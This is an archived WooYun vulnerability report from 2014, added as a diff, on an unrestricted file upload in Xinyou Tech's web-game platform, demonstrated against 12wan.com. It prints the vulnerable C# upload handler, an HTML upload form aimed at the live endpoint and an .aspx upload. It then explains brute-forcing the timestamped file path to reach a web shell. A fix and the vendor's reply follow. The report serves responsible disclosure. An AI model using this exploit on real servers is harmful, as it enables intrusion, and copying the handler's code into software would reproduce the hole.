@@ -1,0 +1,313 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		信游科技页游平台程序通用型文件上传，可攻陷多个主流网页游戏平台  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		信游科技页游平台程序通用型文件上传，可攻陷多个主流网页游戏平台  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/wefgod">wefgod</a> 
+</li><li>提交时间：		2014-01-10 20:46</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-10：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-14：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-17：	细节向第三方安全合作伙伴开放<br/>
+									2014-01-24：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-03：	细节向普通白帽子公开<br/>
+									2014-02-23：	细节向实习白帽子公开<br/>
+									2014-04-10：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">上一发：http://www.wooyun.org/bugs/wooyun-2014-048510<br />
+但是为啥给走小厂商流程了，<br />
+http://www.wooyun.org/bugs/wooyun-2014-047997  这哥们的还漏洞预警了……<br />
+@疯狗 狗哥帮忙！</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">官方案例：<br />
+<br />
+http://52xinyou.cn/anli.htm<br />
+<br />
+<br />
+<br />
+从案例里面选了12玩 http://www.12wan.com 做例子，其它雷同（个别有狗）<br />
+<br />
+api里的upload.ashx文件产生的问题。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">地址：http://www.12wan.com/api/Upload.ashx<br />
+<br />
+</p><pre><code>……<br />
+        extTable.Add(&quot;image&quot;, &quot;gif,jpg,jpeg,png,bmp&quot;);<br />
+        extTable.Add(&quot;flash&quot;, &quot;swf,flv&quot;);<br />
+        extTable.Add(&quot;apw&quot;, &quot;apw&quot;);<br />
+        extTable.Add(&quot;media&quot;, &quot;swf,flv,mp3,mp4,wav,wma,wmv,mid,avi,mpg,asf,rm,rmvb&quot;);<br />
+        extTable.Add(&quot;file&quot;, &quot;cs,doc,ppt,pptx,docx,xls,xlsx,ppt,htm,html,txt,zip,rar,gz,bz2,dll,exe,dbo,oleb&quot;);<br />
+<br />
+        HttpPostedFile file = context.Request.Files[&quot;Filedata&quot;];<br />
+        string _folder = context.Server.MapPath(context.Request[&quot;folder&quot;]);<br />
+        String fileExt = Path.GetExtension(file.FileName).ToLower();<br />
+        string uploadPath = context.Server.MapPath(&quot;~/upload&quot;) + &quot;\\&quot;;<br />
+        bool nodate = false;<br />
+        bool wname = false;<br />
+        string folder = &quot;&quot;;<br />
+        if (Array.IndexOf(((String)extTable[&quot;image&quot;]).Split(&#039;,&#039;), fileExt.Substring(1).ToLower()) != -1)<br />
+        {<br />
+            folder = &quot;image&quot;;<br />
+        }<br />
+        …………<br />
+//如果以上后缀都对不上的话，直接命名文件夹为other<br />
+        else<br />
+        {<br />
+            folder = &quot;other&quot;;<br />
+        }<br />
+        if (nodate)<br />
+        {<br />
+            uploadPath += folder;<br />
+        }<br />
+        else<br />
+        {<br />
+            uploadPath += folder + &quot;\\&quot; + Utility.NowTime.ToString(&quot;yyyyMMdd&quot;, DateTimeFormatInfo.InvariantInfo);<br />
+        }<br />
+<br />
+        if (file != null)<br />
+        {<br />
+            if (!Directory.Exists(uploadPath))<br />
+            {<br />
+                Directory.CreateDirectory(uploadPath);<br />
+            }<br />
+//最后拼凑路径的时候直接使用了file.FileName没有重命名！ <br />
+            var fname = uploadPath + &quot;\\&quot; + Utility.NowTime.ToString(&quot;HHmmss&quot;, DateTimeFormatInfo.InvariantInfo) + file.FileName;<br />
+            file.SaveAs(fname);<br />
+            if (wname)<br />
+            {<br />
+                context.Response.Write(fname);<br />
+            }<br />
+            else<br />
+            {<br />
+                context.Response.Write(&quot;0&quot;);<br />
+            }<br />
+            <br />
+        }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+也就是说文件后缀其实毫无限制。而且路径还是可猜测的！<br />
+<br />
+<br />
+<br />
+具体利用（要点小技巧）：<br />
+<br />
+Html利用代码：<br />
+<br />
+&lt;html&gt;<br />
+<br />
+&lt;form action=&quot;http://www.12wan.com/api/Upload.ashx&quot; name=&quot;test&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;<br />
+<br />
+&lt;input type=&quot;file&quot; name=&quot;Filedata&quot; size=&quot;23&quot; id=&quot;file&quot; /&gt;<br />
+<br />
+&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;<br />
+<br />
+&lt;/form&gt;<br />
+<br />
+&lt;/html&gt;<br />
+<br />
+<br />
+<br />
+Content-Disposition: form-data; name=&quot;Filedata&quot;; filename=&quot;a.aspx&quot;<br />
+<br />
+Filename处要小心，可能会带入如c:等路径会导致出错<br />
+<br />
+<br />
+<br />
+上传之后会显示：<br />
+<br />
+</p><p class="detail"><a href="../images/101946393e720c03c5484f1893a19dc6ecd32423.png" target="_blank"><img src="../images/101946393e720c03c5484f1893a19dc6ecd32423.png" alt="image003.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+没有执行context.Response.Write(fname);直接将路径回显怎么办？前面有一个Utility.NowTime.ToString(&quot;HHmmss&quot;, DateTimeFormatInfo.InvariantInfo)拼接到了用户名前面怎么办？<br />
+<br />
+<br />
+<br />
+仔细看Utility.NowTime.ToString(&quot;HHmmss&quot;, DateTimeFormatInfo.InvariantInfo)<br />
+<br />
+HHmmss，意思就是说两位小时数、两位分、两位秒，好办了吧？<br />
+<br />
+看看当前时间：<br />
+<br />
+</p><p class="detail"><a href="../images/101946577185158f0c58d178f14369b151f4bc40.png" target="_blank"><img src="../images/101946577185158f0c58d178f14369b151f4bc40.png" alt="image004.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+1933xx，大不了我们就从190000开始暴力破解吗，再看看文件夹路径Utility.NowTime.ToString(&quot;yyyyMMdd&quot;, DateTimeFormatInfo.InvariantInfo);<br />
+<br />
+简单，如 20140110<br />
+<br />
+好，拼接第一个链接先：<br />
+<br />
+http://www.12wan.com/upload/other/20140110/190000a.aspx<br />
+<br />
+上神器：<br />
+<br />
+</p><p class="detail"><a href="../images/10194711f46e6516d87265ac83546bcdfa56d630.png" target="_blank"><img src="../images/10194711f46e6516d87265ac83546bcdfa56d630.png" alt="image005.png" width="600"/></a></p><p class="detail"><br />
+<br />
+设置payload<br />
+<br />
+</p><p class="detail"><a href="../images/101947310639a33cc568e0cd38c3ce6a8429bf87.png" target="_blank"><img src="../images/101947310639a33cc568e0cd38c3ce6a8429bf87.png" alt="image006.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/1019481756044f702544e611a2b2fc04f1f56f5b.png" target="_blank"><img src="../images/1019481756044f702544e611a2b2fc04f1f56f5b.png" alt="image007.png" width="600"/></a></p><p class="detail"><br />
+<br />
+开打！<br />
+<br />
+</p><p class="detail"><a href="../images/10194744a0d0867a3e82630be03a11ad331969d3.png" target="_blank"><img src="../images/10194744a0d0867a3e82630be03a11ad331969d3.png" alt="image008.png" width="600"/></a></p><p class="detail"><br />
+<br />
+200了，找到路径<br />
+<br />
+</p><p class="detail"><a href="../images/10194834f27c87a58a3845ef6b51c2402dc284fd.png" target="_blank"><img src="../images/10194834f27c87a58a3845ef6b51c2402dc284fd.png" alt="image009.png" width="600"/></a></p><p class="detail"><br />
+<br />
+成功进入服务器。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> var fname = uploadPath + &quot;\\&quot; + Utility.NowTime.ToString(&quot;HHmmss&quot;, DateTimeFormatInfo.InvariantInfo) + file.FileName;<br />
+<br />
+后面file.FileName采用随机化的文件名并注意使用后缀的白名单，只限定指定类型的文件可以上传！其它一律禁止！<br />
+<br />
+另外厂商据说会给奖励啊？ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/wefgod" title="wefgod">wefgod</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-048516" title="信游科技页游平台程序通用型文件上传，可攻陷多个主流网页游戏平台">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：18 </p>
+													<p class="detail">确认时间：2014-01-14 11:52</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">已经认领  这个系统是老版本系统  公开前会被淘汰  但是非常感激提出漏洞的白帽子们  已经联系乌云官方  准备做次活动  具体请留意官方公告  再次感谢 礼物已送</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="48516";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
